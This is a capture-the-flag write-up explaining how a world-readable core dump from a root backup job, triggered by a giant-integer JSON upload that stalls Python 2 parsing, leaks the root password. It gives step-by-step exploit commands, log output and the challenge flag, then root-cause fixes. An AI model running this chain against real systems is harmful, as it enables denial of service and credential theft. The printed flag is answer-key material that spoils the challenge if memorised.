# Legacy Note-Taking Service

**Flag:** `CTF{L3g4cy_Syst3ms_H4v3_Fun_Att4cks_D0s_on_python2}`

## Challenge Overview

The challenge provided low-privilege SSH access to a Debian 10 container. It ran a root-owned Python 2.7 note-taking web application called Jotter and a root cron job that backed up notes every two minutes. The backup wrapper handled `SIGQUIT` by running `gcore` on the Python process and writing a world-readable core dump under `/tmp`.

Uploading a roughly 5 MiB JSON object with one enormous decimal integer made Python 2's `PyLong_FromString` take longer than the backup's ten-second timeout. The timeout sent `SIGQUIT`; the wrapper dumped process memory, including `ROOT_PASSWORD` loaded from `/root/.env` at startup. That password provided root access and the flag.

## Reconnaissance

- Low-privilege SSH access was supplied for the challenge.
- The web application listened on `127.0.0.1:8080` and used Python 2.7.18 with `BaseHTTPServer`.
- Its source files were under `/var/run/s3cr3t_py_d1r/`: `webapp.py`, `backup.py`, and `backup.sh`.
- `/app/notes/` was root-owned with mode `0755`; only the root web application wrote notes there.
- `/etc/cron.d/backup` ran the backup through `/usr/bin/timeout --signal=QUIT --kill-after=5s 10s` and appended output to `/var/log/cron.log`.

The cron command was:

```sh
*/2 * * * * root cd /tmp && /usr/bin/timeout --signal=QUIT --kill-after=5s 10s /var/run/s3cr3t_py_d1r/backup.sh >> /var/log/cron.log 2>&1
```

## Vulnerable backup flow

`backup.py` loaded `/root/.env` as root and held the password in process memory:

```python
def load_env(path='/root/.env'):
    env = {}
    with open(path) as f:
        for line in f:
            if '=' in line and not line.startswith('#'):
                k, v = line.split('=', 1)
                env[k.strip()] = v.strip()
    return env

def main():
    env = load_env()
    root_password = env.get('ROOT_PASSWORD', '')
    for fname in sorted(...):
        data = json.loads(open(fpath).read())
```

The important operation is `json.loads` on a note while `root_password` remains in memory.

`backup.sh` launched Python and trapped `SIGQUIT`. Its handler ran `gcore`, moved the resulting core file to `/tmp/memdump_$PID.core`, made it readable with mode `0644`, and killed the Python process. The relevant commands were:

```sh
ptrace_dump() {
    /usr/bin/gcore -o /tmp/memdump_core $1
    mv /tmp/memdump_core.$1 /tmp/memdump_$1.core
    chmod 0644 /tmp/memdump_$1.core
    kill -9 $1
}

/usr/local/bin/python $PYTHON_SCRIPT &
PYTHON_PID=$!
trap "ptrace_dump $PYTHON_PID" SIGQUIT
wait $PYTHON_PID
```

## Exploitation

1. Claim a web session and save its cookie:

   ```sh
   curl -i -c /tmp/cj http://127.0.0.1:8080/
   ```

2. Create a JSON payload containing one roughly 5 MiB decimal integer:

   ```sh
   python2 - <<'PY' > /tmp/big.json
   d = '9' * (5 * 1024 * 1024 - 20)
   print('{"# x": ' + d + '}')
   PY
   ```

3. Upload the note using the saved cookie:

   ```sh
   curl -s -b /tmp/cj -X POST http://127.0.0.1:8080/upload --data-binary @/tmp/big.json
   ```

   The response was `OK`.

4. Wait up to two minutes for cron. The backup log showed the timeout and dump:

   ```text
   11:00:01 - Starting notes backup.
   11:00:11 - WARN - [*] SIGQUIT caught by wrapper. Attaching GDB/ptrace to PID 581
   11:00:12 - WARN - [+] Memory dumped successfully via ptrace.
   ```

5. Read the password from the world-readable core dump:

   ```sh
   ls -la /tmp/memdump_*.core
   grep -a 'ROOT_PASSWORD' /tmp/memdump_*.core
   ```

   The dump contained the root password.

6. Use that password with `su root`, then read `/root/flag.txt`:

   ```sh
   su root
   cat /root/flag.txt
   ```

   The flag was `CTF{L3g4cy_Syst3ms_H4v3_Fun_Att4cks_D0s_on_python2}`.

## Root cause and fixes

The `SIGQUIT` handler wrote a world-readable core dump of a process holding the root password. Python 2's arbitrary-precision integer parsing was expensive on very long decimal literals, so the large upload exceeded the ten-second timeout and triggered that handler. The `/upload` endpoint accepted arbitrary bytes without JSON validation.

The source recommends keeping secrets out of processes that can be forced to hang, never making secret-bearing core dumps world-readable, validating uploaded notes, limiting integer and string lengths, and enforcing size and parse-time budgets before `json.loads`.
